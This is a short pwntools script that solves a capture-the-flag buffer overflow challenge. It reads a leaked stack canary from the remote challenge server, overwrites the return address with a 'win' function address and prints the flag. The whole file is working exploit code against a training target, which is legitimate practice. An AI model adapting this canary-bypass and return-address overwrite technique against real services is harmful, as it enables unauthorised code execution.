from pwn import *

WIN = 0x401715 # GDB ("p &win")
BUFF_SIZE = 40 # (40 chars)
CANARY = 0x00

## Var in stack
RBP_SKIP = 8 # (skip 8 bytes rbp)
##################

conn = remote('bigbird.challs.olicyber.it',12006)
r = conn.recvline()
conn.recvline()

CANARY = int(r.decode().split(":")[1][1:].strip(),16)


CANARY = p64(CANARY)
WIN    = p64(WIN)

payload = (b"\x00" * BUFF_SIZE) + CANARY + (b"\x00"*RBP_SKIP) + WIN

print("[*] Sending " + str(payload))
conn.sendline(payload)

conn.recvline()
flag = conn.recvline().decode()
conn.close()
print("[+] FLAG: {}".format(flag))